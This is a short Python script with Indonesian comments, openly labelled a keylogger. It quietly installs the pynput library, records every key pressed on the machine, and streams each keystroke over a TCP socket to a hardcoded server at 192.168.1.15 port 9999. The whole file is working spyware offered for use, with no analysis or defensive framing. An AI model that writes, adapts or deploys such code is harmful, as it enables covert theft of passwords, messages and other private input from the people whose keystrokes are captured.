import sys
import subprocess
import socket

def check_and_install_pynput():
    """
    Memeriksa apakah pynput terinstal. Jika tidak, coba install.
    Mengembalikan True jika pynput ada/berhasil diinstal, False jika gagal.
    """
    try:
        # Coba impor untuk memeriksa keberadaan library
        from pynput import keyboard
        print("[+] Dependensi 'pynput' sudah ada.")
        return True
    except ImportError:
        print("[!] Dependensi 'pynput' tidak ditemukan. Mencoba menginstall...")
        try:
            # Menjalankan pip untuk menginstall pynput
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] 'pynput' berhasil diinstall.")
            return True
        except Exception as e:
            print(f"[!] Gagal menginstall 'pynput'. Error: {e}")
            return False

def run_keylogger():
    """Fungsi utama yang berisi seluruh logika keylogger."""
    # Impor pynput dilakukan di sini, setelah pengecekan berhasil
    from pynput.keyboard import Key, Listener

    # --- Konfigurasi Server ---
    SERVER_HOST = "192.168.1.15"
    SERVER_PORT = 9999

    # --- Inisialisasi Klien ---
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def send_keystroke(data):
        """Mengirim data ke server."""
        try:
            client_socket.send(data.encode('utf-8'))
        except Exception:
            connect_to_server()

    def on_press(key):
        """Fungsi yang dipanggil setiap kali tombol ditekan."""
        try:
            send_keystroke(key.char)
        except AttributeError:
            key_str = str(key)
            if key_str == 'Key.space':
                send_keystroke(' ')
            elif key_str == 'Key.enter':
                send_keystroke('\n')
            else:
                send_keystroke(f' [{key_str}] ')

    def on_release(key):
        """Fungsi yang dipanggil setiap kali tombol dilepas."""
        if key == Key.esc:
            client_socket.close()
            return False

    def connect_to_server():
        """Fungsi untuk mencoba terhubung ke server."""
        try:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
        except Exception:
            pass

    # --- Logika Utama Keylogger ---
    connect_to_server()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# --- Program Utama ---
if __name__ == "__main__":
    print("[*] Memeriksa dependensi...")
    if check_and_install_pynput():
        print("[*] Dependensi terpenuhi. Menjalankan keylogger...")
        run_keylogger()
    else:
        print("[!] Tidak dapat melanjutkan karena dependensi gagal diinstal.")
